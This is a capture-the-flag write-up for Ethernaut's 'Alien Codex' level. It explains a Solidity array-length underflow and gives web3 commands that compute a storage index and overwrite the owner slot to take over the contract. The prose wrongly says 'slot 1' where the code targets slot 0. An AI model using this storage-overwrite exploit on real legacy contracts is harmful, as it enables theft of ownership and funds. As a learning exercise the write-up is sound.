# 19. Alien Codex

You've uncovered an Alien contract. Claim ownership to complete the level.

## Target contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

Go [here](https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/contracts/helpers/Ownable-05.sol) for the sources of the Ownable contract.

## Vulnerability

Before Solidity 0.6.0, the `array.length` allowed read or write operations. So we can easily cause an underflow if we manage to substract 1 to an array length of 0.

0x0000000000000000000000000000000000000000000000000000000000000000 - 1 = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff

So an array with a length of 2^256 - 1 covers the whole storage space, therefore, the function `revise` allows us to rewrite any slot.

Remember that the storage layout is the following:

- slot 0 : 11 bytes are unused - 1 byte for the boolean value `contact` - 20 bytes for the owner address
- slot 1 : 32 bytes for the size of the array `codex`.

We can easily cause the underflow with the following code :

```js
await contract.make_contact();
await contract.retract();
```

Just to make sure of that we can check the array length :

```js
await web3.eth.getStorageAt(contract.address, 1)
// 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
```

Now we need to compute the storage slot where the array data is stored. A dynamic array in slot `p` has its length stored at `p` and its data stored sequentially at slot `keccak256(p)`.

```js
const dataSlot = web3.utils.soliditySha3("0x0000000000000000000000000000000000000000000000000000000000000001");
// 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
```

We want to loop back to slot 1 so : 2^256 which on 32 bytes will cause an overflow and loop back to 0:

```js
const dataSlot = new web3.utils.BN("b10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6", 16)
const maxSlot = new web3.utils.BN("ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff", 16);
// Compute the index to reach storage slot 2^256 - 1 (0xffff....ffff) and add 1 to cause an overflow to reach storage slot 0.
const index = maxSlot.sub(dataSlot).add(new web3.utils.BN(1))
```

Let's make sure that we have the right index :

```js
await contract.codex(index);
// 0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272
//   ^^^^^^^^^^^^^^^^^^^^ ^^  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
//        UNUSED BITS   BOOLEAN           OWNER ADDRESS
```
We see our boolean variable
Now we can rewrite the storage slot 1 with our own address :

```js
// Assuming your personal address is : 0xE613c2d3D36A7934589BC393119eD33Ac165A596
await contract.revise(index, "0x000000000000000000000001E613c2d3D36A7934589BC393119eD33Ac165A596")
```

You can now submit the challenge and move to the next one !
